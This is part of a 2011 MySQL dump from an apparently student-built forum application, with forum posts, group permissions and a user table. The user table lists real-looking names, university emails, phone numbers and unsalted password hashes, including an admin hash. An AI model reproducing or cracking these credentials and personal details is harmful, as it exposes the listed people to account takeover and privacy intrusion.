10:22:09',0,0,2,'',0),(51,'STAB!','It needed to be done.','laur6383','','19/Apr/2011 10:47:46',0,0,21,'',0),(52,'','','test','','19/Apr/2011 11:00:16',0,0,0,'',0),(53,'The Lord of the Rings is more awesome than Star Trek.','Great literature stands the test of time, and gets voted into the 100 best works in the past century.  But Star Trek is OK I guess. My 12 year old had me watch \"The Motion Picture\" (first movie) the other night and it was much shorter than any of the Lord of the Rings movies. Kirk isn\'t fat in Star Trek movie #1. Very surprising.','jeffery','','20/Apr/2011 02:08:47',0,0,24,'',0);
/*!40000 ALTER TABLE `threads` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user`
--

DROP TABLE IF EXISTS `user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `un` varchar(14) NOT NULL,
  `pw` varchar(100) NOT NULL,
  `fullname` varchar(25) NOT NULL,
  `description` varchar(256) NOT NULL,
  `profile` varchar(50) NOT NULL,
  `email` varchar(50) NOT NULL,
  `contact` varchar(15) NOT NULL,
  `major` varchar(25) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=73 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user`
--

LOCK TABLES `user` WRITE;
/*!40000 ALTER TABLE `user` DISABLE KEYS */;
INSERT INTO `user` VALUES (0,'cblair','a7c9ad6196294713c3c1b77ea02d31a893622c20','Colby Blair','In a bottle.','colby.png','cblair@vandals.uidah','(208) 301-0061','Computer Science'),(11,'anilson','9a87d79335e25a8489ae1ed5d3d924c301692bbc','Alex Nilson','Dat Goose','gus_small.png','alexnilson@vandals','208-301-0856','Computer Science'),(13,'sbeddall','697fa0dcb7c5da90b4984f0b8ca6c4bd8b52d51f','','','soon.png','','',''),(15,'brett','ba32d6e55febca1d48bf0a6a82587f6f56bdf6b3','Brett Hitchcock','On fire.','khaaan.png','here@there.comdfdf','123','CS'),(17,'timb','eb09ca756dfbbbfb1fa50970e9549991fbffcefd','','','','','',''),(18,'claurino','df0a2565817c6194cd5c1176bb324ed0b8e284b6','','','','','',''),(21,'abhay','3bd010e4268f9786644c365f32e3e343becbb710','','','','','',''),(22,'drj','a7c9ad6196294713c3c1b77ea02d31a893622c20','','','','','',''),(24,'admin','d8e217ded5272fe8f299468e47a0800cde0d5cc3','','','','','',''),(37,'sand9300','92429d82a41e930486c6de5ebda9602d55c39986','','','','sand9300@vandals.uidaho.edu','',''),(38,'pythonspy','d8389a40cdfa1a43a9ed250cf791adbe721d273c','','','','pythonspy@vandals.uidaho.edu','',''),(42,'cbabraham','dd2edb87ea9eb7a32fd4057276d3a1fab861c1d5','','','','cbabraham@uidaho.edu','',''),(45,'long3841','1e07b932de079b26503ac3d8bc85e8e2910080e0','zeke long','gus developer','','long3841@vandals','','cs'),(46,'jeffery','c0b137fe2d792459f26ff763cce44574a5b5ab03','Clinton Jeffery','Associate Professor','','jeffery@uidaho.edu','208-885-4789','Computer Science'),(48,'loom8595','b2b2b07728a2ea42f4925ec39bf115a4a0da9cf5','','','','loom8595@uidaho.edu','',''),(53,'laur6383','df0a2565817c6194cd5c1176bb324ed0b8e284b6','','','','laur6383@uidaho.edu','',''),(56,'dcarl','e4ec7b80e17fa4c3d488c39846827904e3f983d4','','','','dcarl@uidaho.edu','',''),(57,'jafara','4371224e2e7bc0eb1f5b628ee5a07e01f86d8691','','','','jafara@uidaho.edu','',''),(58,'balld','371f9009b1308b07cf0c8c79a7eb05072a1cae19','','','','balld@uidaho.edu','',''),(64,'laur7919','68993e9ba1371df9abf7762c0b2d20e92df28b61','','','','laur7919@uidaho.edu','',''),(65,'deic3977','da9253ae0340c616247b5673e102ae12fe9c1ea3','','','','deic3977@uidaho.edu','',''),(72,'zalgo!!!','7288edd0fc3ffcbe93a0cf06e3568e28521687bc','The magnificent','A really bad man','','zalgo!!!@uidaho.edu','(800) HACK-THIS','Tom foolery');
/*!40000 ALTER TABLE `user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `usergroup`
--

DROP TABLE IF EXISTS `usergroup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `usergroup` (
  `uid` int(11) NOT NULL,
  `gid` int(11) NOT NULL,
  `perm` tinyint(4) NOT NULL,
  KEY `uid` (`uid`),
  KEY `gid` (`gid`),
  CONSTRAINT `usergroup_ibfk_1` FOREIGN KEY (`uid`) REFERENCES `user` (`id`) ON DELETE CASCADE,
  CONSTRAINT `usergroup_ibfk_2` FOREIGN KEY (`gid`) REFERENCES `ggroup` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `usergroup`
--

LOCK TABLES `usergroup` WRITE;
/*!40000 ALTER TABLE `usergroup` DISABLE KEYS */;
INSERT INTO `usergroup` VALUES (24,10,7),(21,10,0),(21,5,0),(15,10,7),(15,5,7),(13,5,7),(13,10,7),(0,10,7),(0,11,7),(15,11,7),(13,11,7),(11,5,7),(11,10,7),(11,11,7),(45,5,6),(45,10,7),(45,11,7),(48,5,0),(48,10,0),(48,11,0),(53,21,7),(46,24,7),(0,24,0),(46,21,0),(58,10,0),(58,25,7),(0,5,0),(64,30,7),(65,21,0),(72,10,0);
/*!40000 ALTER TABLE `usergroup` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2011-04-21  9:18:51
